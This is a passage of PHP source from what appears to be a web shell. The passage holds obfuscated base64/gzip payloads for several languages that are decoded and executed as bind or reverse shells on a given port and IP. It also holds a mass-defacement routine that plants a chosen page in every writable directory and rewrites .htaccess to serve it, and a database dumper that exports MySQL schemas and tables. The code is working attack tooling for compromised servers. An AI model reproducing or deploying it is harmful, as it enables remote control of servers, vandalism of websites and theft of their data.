LrKb22fM9J2DGkRpGJuaaefn/mDNj6Li/Y/4VlKbn75OIE237AlQdzcRwnYja2oHBG92pdn6YCeiOmUvH0prjZpe3nqVM9azt/sd0rmyX7vw==";
               break;
            case 'ruby':
               $source = "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";
               break;
        }

        $content = str_replace('#PASSWORD_VALUE#', $pass, gzinflate(base64_decode($source)));
        $currentUser = Session::__session_manager('GET', null, 'usr');
        $userInfo = Utils::__get_usergroup();
        $content = str_replace('#user#', $currentUser, $content);
        $content = str_replace('#connection#', $dataRaw[1]['added'], $content);
        $content = str_replace('#HOSTUSER#', $userInfo['user'], $content);
        $content = str_replace('#HOST#', __SERVER_HOST__, $content);
        $content = str_replace('#TIMEZONE#', $GLOBALS['ER0_config']['timezone'], $content);
        $args = ($type == 'bind' ? "$PORT" : "$PORT $IPS");
        $response = Terminal::__temp_execute($content, $args, $lang, $name, true);

        return $response;
        // Terminal::__post_execute($args);
        // exit;
    }
}

class MassDeface
{
    public static function __massdeface_html($dir){
        $dst =  $GLOBALS['ER0_config']['show_fullpath'] ? $dir : basename($dir);

        $opt = '';
        foreach ($GLOBALS['ER0_array']['script_ext'] as $ext) {
            $opt .= '<option value="' . $ext . '" class="text-left">' . $ext . '</option>';
        }

        return
'<div class="md:flex gap-2 text-left">
    <div class="w-full">
        <label for="filename" class="block mb-2 text-sm font-medium text-foreground">Script Name</label>
        <input type="text" id="filename" value="" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="index, hacked, etc...">
    </div>
    <div class="w-full my-2 md:my-0">
        <label for="path" class="block mb-2 text-sm font-medium text-foreground">Base Path</label>
        <input type="text" id="path" value="'. $dst .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="path/to/deface">
    </div>

    <div class="flex gap-2">
        <div class="w-auto">
            <label for="extension" class="block mb-2 text-sm font-medium text-foreground">Extension</label>
            <select id="extension" class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >
                <option value="all" selected class="text-left">All</option>
                '. $opt .'
            </select>
        </div>
        <div class="w-auto">
            <label for="htaccess" class="block mb-2 text-sm font-medium text-foreground">.htaccess</label>
            <div class="flex gap-2">
                <select id="htaccess" class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >
                    <option value="yes" selected class="text-left">Yes</option>
                    <option value="no" class="text-left">No</option>
                </select>
                <a onclick="MD()" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
            </div>
        </div>
    </div>
</div>
<div class="mt-4 text-left">
    <div class="h-full flex-1">
        <label for="content" class="block mb-2 text-sm font-medium text-foreground">Script Content</label>
        <textarea id="content" rows="20" class="h-[75%] sm:h-[77%] block p-2.5 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Example: Hacked by ./MY7HX"></textarea>
    </div>
</div>'
        ;
    }

    public static function __massdeface_js()
    {
        if (Session::__check_session()) {
            return
'function MD(){
    name = $("#filename").val();
    path = $("#path").val();
    extension = $("#extension").val();
    content = $("#content").val();
    htaccess = $("#htaccess").val();
    var DATA = {
        "key": "MASSDEFACE",
        "name": charcodeEnc(name),
        "path": charcodeEnc(path),
        "ext": charcodeEnc(extension),
        "content": charcodeEnc(content),
        "htaccess": charcodeEnc(htaccess)
    };
    notify(`loading`);
    const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
    sendRequest.send(
        function (data) {
            Swal.close();
            data = JSON.parse(data);
            notify(charcodeDec(data.status), data.detail, true, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `DEFACED!`, `orange`, 3000);
        },
        function (status, error) {
            if(status != 0){
                console.error("AJAX Error:", status, error);
                clr = `red`;
                if(status >= 500){
                    clr = `yellow`;
                }
                notify(`error`, charcodeEnc(status +" "+ error),true, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `ERROR!`, clr, 10000000);
            }
        }
    );
}'
            ;
        }
    }

    public static function __massdeface_function()
    {
        if (isset($_POST['key']) && Request::__post_request('key') == 'MASSDEFACE') {
            $name = Utils::__charcode_dec(Request::__post_request('name'));
            $path = Utils::__charcode_dec(Request::__post_request('path'));
            $ext = Utils::__charcode_dec(Request::__post_request('ext'));
            $content = Utils::__charcode_dec(Request::__post_request('content'));
            $htaccess = Utils::__charcode_dec(Request::__post_request('htaccess'));

            $status = 'failed';
            if (empty($name)) {
                $detail = 'Cannot Defaced with empty name';
            } else if (empty($path)) {
                $detail = 'Please fill the path';
            } else {
                $data = self::__deface_dir_recursive($name, $path, $ext, $content, $htaccess);
                $status = 'success';
                $detail = 'Defaced ' . $data['folder'] . ' folders and encountered ' . $data['err'] . ' errors.';
            }

            $response = [
                'status' => Utils::__charcode_enc($status),
                'detail' => Utils::__charcode_enc($detail)
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }
    }

    private static function __deface_dir_recursive($name, $path, $ext, $content, $Chtaccess)
    {
        $stat = [
            'folder' => 0,
            'err' => 0
        ];

        if ($Chtaccess == 'yes') {
            $Chtaccess = true;
        } else {
            $Chtaccess = false;
        }

        $htpath = $path . __DIRECTORY_SEPARATOR__ . '.htaccess';
        $htaccess = "DirectoryIndex";
        $stat['folder']++;

        if (is_writable($path)) {
            // Create deface scripts in the current directory
            if ($ext == 'all') {
                foreach ($GLOBALS['ER0_array']['script_ext'] as $ex) {
                    $scriptPath = $path . __DIRECTORY_SEPARATOR__ . $name . '.' . $ex;
                    $htaccess .= ' ' . $name . '.' . $ex;
                    if (Filesman::__save_file($scriptPath, $content) === false) {
                        $stat['err']++;
                    }
                }
            } else {
                $scriptPath = $path . __DIRECTORY_SEPARATOR__ . $name . '.' . $ext;
                $htaccess .= ' ' . $name . '.' . $ext;
                if (Filesman::__save_file($scriptPath, $content) === false) {
                    $stat['err']++;
                }
            }

            // Handle .htaccess modification
            if ($Chtaccess) {
                if (file_exists($htpath) && is_writable($htpath)) {
                    $htaccessContent = Filesman::__read_file($htpath);
                    // Comment out existing DirectoryIndex entries
                    $htaccessContent = preg_replace('/^DirectoryIndex\s+/m', '#DirectoryIndex ', $htaccessContent);
                    $htaccessContent .= "\n" . $htaccess;
                    if (Filesman::__save_file($htpath, $htaccessContent) === false) {
                        $stat['err']++;
                    }
                } else {
                    // Create new .htaccess file
                    if (Filesman::__save_file($htpath, $htaccess) === false) {
                        $stat['err']++;
                    }
                }
            } else {
                if (file_exists($htpath) && is_writable($htpath)) {
                    $htaccessContent = Filesman::__read_file($htpath);
                    // Remove newly added DirectoryIndex entries
                    $htaccessContent = preg_replace('/^DirectoryIndex\s+.*$/m', '', $htaccessContent);
                    // Uncomment DirectoryIndex entries
                    $htaccessContent = preg_replace('/^#DirectoryIndex\s+/m', 'DirectoryIndex ', $htaccessContent);
                    if (Filesman::__save_file($htpath, trim($htaccessContent)) === false) {
                        $stat['err']++;
                    }
                }
            }

            // Iterate through the directory contents
            $dirBase = scandir($path);
            foreach ($dirBase as $base) {
                $childDir = $path . __DIRECTORY_SEPARATOR__ . $base;

                if ($base == '..' || $base == '.') continue;

                if (is_dir($childDir)) {
                    if (is_writable($childDir)) {
                        $res = self::__deface_dir_recursive($name, $childDir, $ext, $content, $htaccess);
                        $stat['folder'] += $res['folder'];
                        $stat['err'] += $res['err'];
                    } else {
                        $stat['err']++;
                    }
                }
            }
        } else {
            $stat['err']++;
        }

        return $stat;
    }
}

class DBDumper
{
    public static function __dbdumper_html($dir){
        $dst =  $GLOBALS['ER0_config']['show_fullpath'] ? $dir . __DIRECTORY_SEPARATOR__ : rand(10000, 99999);

        return
'<div class="md:flex gap-2 lg:w-2/4 text-left">
    <input type="hidden" id="dbnameoutputtemp" value="'. str_replace('.', '-', __SERVER_HOST__) .'_'. date("Y-m-d") .'.sql">
    <div class="w-full grid gap-2 text-foreground">
        <div class="relative flex justify-start items-center w-full gap-2">
            <label for="db_host" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">db_host</label>
            <label for="db_host" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[5.5rem] text-sm font-medium text-themecolor-400">:</label>
            <input type="text" value="localhost" id="db_host" class="block pt-2.5 ps-[6rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Database Host">
        </div>
        <div class="relative flex justify-start items-center w-full gap-2">
            <label for="db_username" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">db_user</label>
            <label for="db_username" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[5.5rem] text-sm font-medium text-themecolor-400">:</label>
            <input type="text" id="db_username" class="block pt-2.5 ps-[6rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Database Username">
        </div>
        <div class="relative flex justify-start items-center w-full gap-2">
            <label for="db_password" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">db_pass</label>
            <label for="db_password" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[5.5rem] text-sm font-medium text-themecolor-400">:</label>
            <input type="text" id="db_password" class="block pt-2.5 ps-[6rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Database Password">
        </div>
        <div class="relative flex justify-start items-center w-full gap-2">
            <label for="db_name" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">db_name</label>
            <label for="db_name" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[5.5rem] text-sm font-medium text-themecolor-400">:</label>
            <input type="text" id="db_name" onkeyup="x=$(this).val(); $(`#sqldestination`).val(`'. ($GLOBALS['ER0config']['show_fullpath'] ? $dst : '') .'`+x+`_`+$(dbnameoutputtemp).val());" class="block pt-2.5 ps-[6rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Database Name">
            <a onclick="DBDUMP(`db_scheme`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto whitespace-pre  bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Dump DB</a>
            <a onclick="DBDUMP(`reset`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto whitespace-pre  bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Reset</a>
        </div>
        <div class="relative flex justify-start items-center w-full gap-2">
            <label for="db_table" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">db_table</label>
            <label for="db_table" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[5.5rem] text-sm font-medium text-themecolor-400">:</label>
            <input disabled type="text" id="db_table" onkeyup="x=$(this).val(); $(`#sqlcoldestination`).val(`'. ($GLOBALS['ER0config']['show_fullpath'] ? $dst : '') .'`+(x.includes(`,`) ? `multiple` : x )+`_`+$(`#db_name`).val()+`_`+$(dbnameoutputtemp).val());" class="text-themecolor-400 cursor-not-allowed pointer-events-none block pt-2.5 ps-[6rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Table Name e.g user | user,admin">
            <a disabled id="db_table_btn" onclick="DBDUMP(`db_scheme_table`)" class="text-themecolor-400 cursor-not-allowed pointer-events-none text-sm cursor-pointer font-medium inline-flex items-center justify-center rounded w-[8rem] whitespace-pre  bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Dump Column</a>
        </div>
    </div>

</div>

<div class="md:flex gap-2 mt-4 text-foreground text-left">
    <div class="w-full mt-4 md:mt-0">
        <label for="sqlschemedestination" class="block mb-2 text-sm font-medium">DB Scheme save destination</label>
        <div class="flex gap-2">
            <input disabled type="text" id="sqlschemedestination" value="'. $dst .'_dbscheme_'. str_replace('.', '-', __SERVER_HOST__) .'_'. date("Y-m-d") .'.txt" class="text-themecolor-400 cursor-not-allowed pointer-events-none border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="path/to/folder/file">
            <a disabled id="sqlschemedestination_btn" onclick="DBDUMP(`scheme`,`sqlschemedestination`)" class="text-themecolor-400 cursor-not-allowed pointer-events-none text-sm cursor-pointer font-medium inline-flex items-center justify-center rounded w-[8rem] whitespace-pre  bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Save Scheme</a>
        </div>
    </div>
</div>

<div class="md:flex gap-2 mt-4 text-foreground text-left">
    <div class="w-full mt-4 md:mt-0">
        <label for="sqlcoldestination" class="block mb-2 text-sm font-medium">DB table save destination</label>
        <div class="flex gap-2">
            <input disabled type="text" id="sqlcoldestination" value="'. $dst .'_col_'. str_replace('.', '-', __SERVER_HOST__) .'_'. date("Y-m-d") .'.sql" class="text-themecolor-400 cursor-not-allowed pointer-events-none border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="path/to/folder/file.sql">
            <a disabled id="sqlcoldestination_btn" onclick="DBDUMP(`table`,`sqlcoldestination`)" class="text-themecolor-400 cursor-not-allowed pointer-events-none text-sm cursor-pointer font-medium inline-flex items-center justify-center rounded w-[8rem] whitespace-pre  bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Save Column</a>
        </div>
    </div>
</div>

<div class="flex gap-2 text-foreground mt-4 text-left">
    <div class="w-full mt-4 md:mt-0">
        <label for="sqldestination" class="block mb-2 text-sm font-medium">DB save destination</label>
        <div class="flex gap-2">
            <input disabled type="text" id="sqldestination" value="'. $dst .'_'. str_replace('.', '-', __SERVER_HOST__) .'_'. date("Y-m-d") .'.sql" class="text-themecolor-400 cursor-not-allowed pointer-events-none border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="path/to/folder/file.sql">
            <a disabled id="sqldestination_btn" onclick="DBDUMP(`all`,`sqldestination`)" class="text-themecolor-400 cursor-not-allowed pointer-events-none text-sm cursor-pointer font-medium inline-flex items-center justify-center rounded w-[8rem] whitespace-pre bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">Save All</a>
        </div>
    </div>
</div>

<div class="relative overflow-auto text-left w-full">
    <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
        <summary class="text-foreground flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg" >
        <h2 class="font-medium text-sm">Database Scheme</h2>
        <svg
            class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
        </svg>
        </summary>
        <div class="h-auto flex-1">
            <div id="dump_scheme" class="h-auto max-h-[50vh] overflow-auto whitespace-pre block p-2 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 text-themecolor-400"></div>
        </div>
    </details>
</div>

<script>
$(`#tools_container`).addClass(`overflow-auto`);
</script>'
        ;
    }

    public static function __dbdumper_js()
    {
        if (Session::__check_session()) {
            return
'function DBDUMP(dump, destId = null){

    if(dump == `reset`){
        $("#db_name").val(``);
        $("#dump_scheme").html(``);

        $("#db_host").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_username").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_password").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_name").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        $("#db_table").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_table_btn").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlcoldestination").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlcoldestination_btn").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqldestination").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqldestination_btn").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        $("#sqlschemedestination").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlschemedestination_btn").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        document.getElementById(`db_host`).removeAttribute("disabled");
        document.getElementById(`db_username`).removeAttribute("disabled");
        document.getElementById(`db_password`).removeAttribute("disabled");
        document.getElementById(`db_name`).removeAttribute("disabled");

        document.getElementById(`db_table`).setAttribute("disabled", "");
        document.getElementById(`db_table_btn`).setAttribute("disabled", "");

        document.getElementById(`sqlcoldestination`).setAttribute("disabled", "");
        document.getElementById(`sqlcoldestination_btn`).setAttribute("disabled", "");

        document.getElementById(`sqlschemedestination`).setAttribute("disabled", "");
        document.getElementById(`sqlschemedestination_btn`).setAttribute("disabled", "");

        document.getElementById(`sqldestination`).setAttribute("disabled", "");
        document.getElementById(`sqldestination_btn`).setAttribute("disabled", "");

        return false;
    } else {
        $("#db_host").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_username").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_password").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_name").addClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        $("#db_table").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#db_table_btn").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlcoldestination").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlcoldestination_btn").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqldestination").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqldestination_btn").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        $("#sqlschemedestination").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);
        $("#sqlschemedestination_btn").removeClass(`text-themecolor-400 cursor-not-allowed pointer-events-none`);

        document.getElementById(`db_host`).setAttribute("disabled", "");
        document.getElementById(`db_username`).setAttribute("disabled", "");
        document.getElementById(`db_password`).setAttribute("disabled", "");
        document.getElementById(`db_name`).setAttribute("disabled", "");

        document.getElementById(`db_table`).removeAttribute("disabled");
        document.getElementById(`db_table_btn`).removeAttribute("disabled");

        document.getElementById(`sqlcoldestination`).removeAttribute("disabled");
        document.getElementById(`sqlcoldestination_btn`).removeAttribute("disabled");

        document.getElementById(`sqlschemedestination`).removeAttribute("disabled", "");
        document.getElementById(`sqlschemedestination_btn`).removeAttribute("disabled", "");

        document.getElementById(`sqldestination`).removeAttribute("disabled");
        document.getElementById(`sqldestination_btn`).removeAttribute("disabled");
    }
    params = getParams();

    db_host = $("#db_host").val();
    db_username = $("#db_username").val();
    db_password = $("#db_password").val();
    db_name = $("#db_name").val();

    db_table_name = `none`;
    sqldestination = `none`;
    schemeval = `none`;

    if(destId != null){
        sqldestination = $(`#${destId}`).val();
        if(sqldestination == ``){
            notify(`failed`, charcodeEnc(`Dump failed, please fill the output destination!`));
            return false;
        }
    }

    if(dump == `table` || dump == `db_scheme_table`){
        db_table_name = $("#db_table").val();
    }

    if(dump == `scheme`){
        schemeval = $("#dump_scheme").html();
    }

    if(db_table_name == ``){
        notify(`failed`, charcodeEnc(`Dump failed, please fill the table name!`));
        return false;
    }
    var DATA = {
        "key": "DBDUMPER",
        "dir": params["dir"],
        "option": charcodeEnc(dump),
        "db_host": charcodeEnc(db_host),
        "db_username": charcodeEnc(db_username),
        "db_password": charcodeEnc(db_password),
        "db_name": charcodeEnc(db_name),
        "db_table_name": charcodeEnc(db_table_name),
        "sqldestination": charcodeEnc(sqldestination),
        "schemeval": charcodeEnc(schemeval)
    };

    notify(`loading`);

    const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
    sendRequest.send(
        function (data) {
            Swal.close();
            data = JSON.parse(data);
            if(charcodeDec(data.detail).includes(`ERR`)){
                DBDUMP(`reset`);

                if(charcodeDec(data.scheme) == `failed_connect`){
                    $("#db_name").val(db_name);
                }

                notify(charcodeDec(data.status), data.detail,false, `<i class="bx bx-data bx-tada text-5xl" ></i>`);
            } else {
                if(destId != null){
                    redirect = true;
                    if(dump == `table` || dump == `scheme`){
                        redirect = false;
                    }
                    notify(charcodeDec(data.status), data.detail, redirect, `<i class="bx bx-save bx-tada text-5xl" ></i>`, `SAVED!`, null, 3000);
                } else {
                    notify(charcodeDec(data.status), data.detail, false, `<i class="bx bxs-data bx-tada text-5xl" ></i>`, `DUMPED!`, `orange`, 1500);
                    $(`#dump_scheme`).html(charcodeDec(data.scheme));
                }
            }

        },
        function (status, error) {
            if(status != 0){
                console.error("AJAX Error:", status, error);
                clr = `red`;
                if(status >= 500){
                    clr = `yellow`;
                }
                notify(`error`, charcodeEnc(status +" "+ error),false, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `ERROR!`, clr, 10000000);
            }
        }
    );

}'
            ;
        }
    }

    public static function __dbdumper_function()
    {
        if (isset($_POST['key']) && Request::__post_request('key') == 'DBDUMPER') {
            $option = Utils::__charcode_dec(Request::__post_request('option'));
            $db_host = Utils::__charcode_dec(Request::__post_request('db_host'));
            $db_username = Utils::__charcode_dec(Request::__post_request('db_username'));
            $db_password = Utils::__charcode_dec(Request::__post_request('db_password'));
            $db_name = Utils::__charcode_dec(Request::__post_request('db_name'));

            $db_table_name = Utils::__charcode_dec(Request::__post_request('db_table_name'));
            $sqldestination = Utils::__charcode_dec(Request::__post_request('sqldestination'));
            $schemeval = Utils::__charcode_dec(Request::__post_request('schemeval'));

            if (empty($option) == 'all' || empty($option) == 'table') {
                if (empty($sqldestination) || $sqldestination == 'none') {
                    $detail = 'ERR: Dump failed, please fill the output destination!';
                }
            }

            $dir = Utils::__string_dec(Request::__post_request('dir'));
            $dir = Utils::__construct_path($dir);
            chdir($dir);

            $status = 'failed';
            if (empty($db_host) || empty($db_username) || empty($db_password) || empty($db_name)) {
                $detail = 'ERR: Dump failed, please fill all required input!';
            } else {

                try {
                    $conn = new PDO("mysql:host=$db_host;", $db_username, $db_password);
                    // set the PDO error mode to exception
                    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                    $data = self::__dump_database($option, $db_host, $db_username, $db_password, $db_name, $db_table_name, $sqldestination, $schemeval);
                    $status = $data['status'];
                    $detail = $data['detail'];
                    $scheme = $data['scheme'];
                } catch (PDOException $e) {
                    $status = "failed";
                    $detail = "ERR: Failed to connect to MySQL: " . $e->getMessage();
                    $scheme = 'failed_connect';
                }
            }

            $response = [
                'status' => Utils::__charcode_enc($status),
                'detail' => Utils::__charcode_enc($detail),
                'scheme' => Utils::__charcode_enc($scheme)
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }
    }

    public static function __dump_database($option, $db_host, $db_username, $db_password, $db_name, $db_table_name, $sqldestination, $schemeval = null)
    {
        $mysqli = new mysqli($db_host, $db_username, $db_password, $db_name);
        $all_output = '';
        $column_output = '';
        $scheme_output = '';
        $scheme = 'none';

        function styles_($str, $clr, $wrap = null, $wrapclr = null)
        {
            if (!empty($wrap)) {
                $strs = explode(",", $wrap);
                return "<span class='text-$wrapclr'>{$strs[0]}<span class='mx-[2px] text-$clr'>$str</span>{$strs[1]}</span>";
            } else {
                return "<span class='text-$clr'>$str</span>";
            }
        }

        if ($mysqli->connect_errno) {
            return [
                'status' => 'failed',
                'detail' => "ERR: Failed to connect to MySQL: " . $mysqli->connect_error,
                'scheme' => $scheme
            ];
        } else {
            $tables = $mysqli->query("SHOW TABLES");
            if (!$tables) {
                return [
                    'status' => 'failed',
                    'detail' => "ERR: Failed to get tables: " . $mysqli->error,
                    'scheme' => $scheme
                ];
            }
            $db_table_names_array = array_map('trim', explode(',', $db_table_name));

            while ($table = $tables->fetch_array()) {
                $tableName = $table[0];
                $createTableSQL = $mysqli->query("SHOW CREATE TABLE $tableName");
                $createTable = $createTableSQL->fetch_assoc();
                $createStatement = $createTable['Create Table'];

                $all_output .= "$createStatement;\n";

                if ($option == 'db_scheme') {
                    $columns = $mysqli->query("SHOW COLUMNS FROM $tableName");
                    if (!$columns) {
                        return [
                            'status' => 'failed',
